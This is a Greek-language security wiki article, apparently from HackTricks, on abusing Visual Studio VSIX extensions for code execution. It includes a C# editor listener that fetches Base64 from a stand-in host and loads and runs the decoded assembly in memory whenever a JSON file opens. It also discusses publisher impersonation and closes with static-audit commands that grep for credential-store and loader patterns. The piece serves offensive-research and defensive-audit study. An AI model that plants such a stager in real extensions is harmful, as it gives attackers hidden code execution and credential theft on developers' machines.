# Κατάχρηση επεκτάσεων VSIX του Visual Studio

{{#include ../banners/hacktricks-training.md}}

Μια επέκταση του Visual Studio μπορεί να μετατρέψει τη συνηθισμένη δραστηριότητα στον επεξεργαστή σε εκτέλεση κώδικα με την ταυτότητα του συνδεδεμένου χρήστη. Ένα κακόβουλο VSIX, ένας εκδότης που μοιάζει με νόμιμο ή μια παραβιασμένη ενημέρωση επέκτασης μπορεί να προσεγγίσει αυτόν τον χρήστη μέσω των συνηθισμένων καναλιών εγκατάστασης. Η εγκατάσταση με προτροπή διαχειριστή είναι μια συναινετική διαδικασία εγκατάστασης, όχι αυτόματη κλιμάκωση προνομίων.<sup>[[1]](#references)</sup>

## Μοντέλο εκτέλεσης

Οι επεκτάσεις του κλασικού VSSDK εκτελούνται συνήθως μέσα στο `devenv.exe`. Το νεότερο μοντέλο `VisualStudio.Extensibility` εκτελεί κατά κύριο λόγο τις σύγχρονες επεκτάσεις .NET εκτός διεργασίας: το Visual Studio διαμεσολαβεί τις κλήσεις προς μια αποκλειστική διεργασία `Microsoft.ServiceHub.Host.Extensibility`, απομονώνοντας τη σταθερότητα του IDE, αλλά **όχι** περιορίζοντας την πρόσβαση της επέκτασης στα δικαιώματα Windows του χρήστη. Το ακριβές όνομα του εκτελέσιμου αρχείου μπορεί να περιλαμβάνει επίθημα αρχιτεκτονικής, όπως `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Ενεργοποίηση από συνηθισμένη δραστηριότητα στον επεξεργαστή

Αντί να εμφανίζει μόνο μια εμφανή εντολή μενού, μια επέκταση μπορεί να υλοποιήσει το `ITextViewOpenClosedListener`. Η callback `TextViewOpenedAsync` καλείται για έγγραφα που ταιριάζουν, ενώ το `TextViewExtensionConfiguration.AppliesTo` μπορεί να περιορίσει την ενεργοποίηση σε έναν κοινό τύπο, όπως το JSON. Ένας πραγματικός formatter ή linter μπορεί να εκτελεί κανονικά τη διαφημιζόμενη λειτουργία του, ενώ μια δεύτερη ενέργεια εκτελείται ως παρενέργεια του ανοίγματος ενός αρχείου.<sup>[[1]](#references)[[3]](#references)</sup>

Το ακόλουθο περιορισμένο μοτίβο παρουσιάζει τα σημαντικά σημεία εκτέλεσης· παραλείπει τον νόμιμο formatter και τη διαχείριση σφαλμάτων για λόγους σαφήνειας.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Φορτωτής διαχειριζόμενης assembly στη μνήμη που ενεργοποιείται από συμβάν</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Αυτή η αλυσίδα κατεβάζει κείμενο Base64, το αποκωδικοποιεί σε bytes assembly, το φορτώνει από ένα `MemoryStream` μέσω ενός collectible `AssemblyLoadContext`, καλεί το ανακλαστικά εντοπισμένο `EntryPoint` χωρίς παραμέτρους ή με ένα `string[]`, περιμένει την ολοκλήρωση ασύγχρονων entry points και αποφορτώνει το context. Το δεύτερο στάδιο δεν γράφεται στον δίσκο, αν και το VSIX και το κύριο extension DLL παραμένουν τεχνουργήματα στον δίσκο. Το Base64 δεν παρέχει αυθεντικότητα ή εμπιστευτικότητα· η χρήση HTTP επιτρέπει επίσης σε έναν attacker που παρεμβάλλεται στη διαδρομή να αντικαταστήσει την απόκριση.<sup>[[1]](#references)</sup>

Οι λειτουργικές παραλλαγές περιλαμβάνουν την καταστολή όλων των εξαιρέσεων, ώστε η διαφημιζόμενη λειτουργία να συνεχίζεται όταν αποτυγχάνει το staging, ή τη χρήση του `ITextViewChangedListener` για την ενεργοποίηση μετά από αλλαγές. Ο κώδικας εκτελείται στο extension host και μπορεί να χρησιμοποιήσει managed APIs, P/Invoke, αρχεία, διαπιστευτήρια και child processes που είναι διαθέσιμα στον συγκεκριμένο χρήστη.<sup>[[1]](#references)</sup>

Για μια σχετική επιφάνεια εκτέλεσης ειδική για editor, η οποία βασίζεται στην αυτόματη φόρτωση native plugin, δείτε:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Κατάχρηση εμπιστοσύνης στο Marketplace και στη διανομή

Ένα VSIX μπορεί να φτάσει ως αρχείο που κοινοποιείται απευθείας ή μέσω phishing, από το web Marketplace ή μέσω του ενσωματωμένου προγράμματος περιήγησης Marketplace του Visual Studio. Η εγγραφή publisher, η οποία επιβάλλει κυρίως μοναδικότητα και μια λίστα δεσμευμένων λέξεων, μπορεί να επιτρέψει οπτικά παραπλανητικές ταυτότητες publisher· ακόμη πιο αποτελεσματική είναι η παραβίαση ενός ήδη έμπιστου publisher ή extension, επειδή αξιοποιεί μια ήδη εγκατεστημένη βάση χρηστών. Η εγκατάσταση από το Marketplace καλεί το Visual Studio Installer και τοποθετεί προσωρινά το ληφθέν VSIX στον φάκελο `%LOCALAPPDATA%\Temp`· το `payload.vsix` χρησιμοποιείται επίσης νόμιμα, επομένως το όνομα αρχείου από μόνο του δεν αποτελεί ένδειξη.<sup>[[1]](#references)</sup>

Η MDSec δεν εντόπισε κάποιο πρωτόκολλο URL του Visual Studio που να εγκαθιστά απευθείας ένα extension. Ο operator εξακολουθεί να χρειάζεται τον χρήστη για να εγκαταστήσει/εμπιστευτεί το VSIX ή πρέπει να παραβιάσει μια υπάρχουσα διαδρομή διανομής extension. Ένα πακέτο `AllUsers` εγκαθίσταται στον φάκελο εγκατάστασης του Visual Studio και μπορεί να ζητήσει ανύψωση δικαιωμάτων, αλλά αυτό αποτελεί κανονική συμπεριφορά installer με συναίνεση και όχι αυτόματη οδό προς administrator ή SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Στατικός έλεγχος σε μεγάλη κλίμακα

Τα πακέτα VSIX είναι συνήθως containers ZIP, επομένως μια ασφαλής ροή εργασίας ελέγχου Marketplace μπορεί να απαριθμεί πακέτα, να τα αποσυμπιέζει **χωρίς να φορτώνει κώδικα extension**, να αναλύει τα manifests, να εντοπίζει επιφάνειες εκτέλεσης και να αποσυμπιέζει managed assemblies με το `ilspycmd`. Δώστε προτεραιότητα στα assemblies που ανήκουν στο extension, αφού εξαιρέσετε τις συνήθεις ενσωματωμένες εξαρτήσεις, και έπειτα συσχετίστε συμβολοσειρές credential-store με συμπεριφορικές ομάδες, όπως ανάγνωση αρχείων μαζί με αποστολή μέσω δικτύου, encode μαζί με αποστολή, λήψη μαζί με εκτέλεση, credential-manager μαζί με πρόσβαση στο δίκτυο ή screenshot μαζί με αποστολή.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Επίσης, καταγράψτε τις native DLLs, τα MSBuild targets, τα scripts, τα T4 templates και τα payloads του installer, αντί να υποθέτετε ότι κάθε επιφάνεια εκτέλεσης αφορά managed code. Συγκρίνετε την ύποπτη συμπεριφορά με τον σκοπό που δηλώνεται στο manifest· η τηλεμετρία και οι νόμιμοι updaters μπορεί να μοιάζουν με exfiltration ή staging. Η αποκλειστικά στατική ανάλυση παραβλέπει packed, obfuscated, δυναμικά επιλυμένο και αδρανή κώδικα, ενώ ο έλεγχος μόνο της τελευταίας έκδοσης παραβλέπει κακόβουλες παλαιότερες εκδόσεις.<sup>[[1]](#references)</sup>

Μια ξεχωριστή επίθεση κατά τη φόρτωση project μπορεί να εκτελέσει ένα κακόβουλο [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) χωρίς εγκατάσταση VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Επανεξέταση των επεκτάσεων του Visual Studio](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Σχετικά με το VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Η δομή ενός πακέτου VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - Εργαλείο .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Η εκστρατεία Blinder Tunnel στοχεύει ιρακινές υποδομές](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
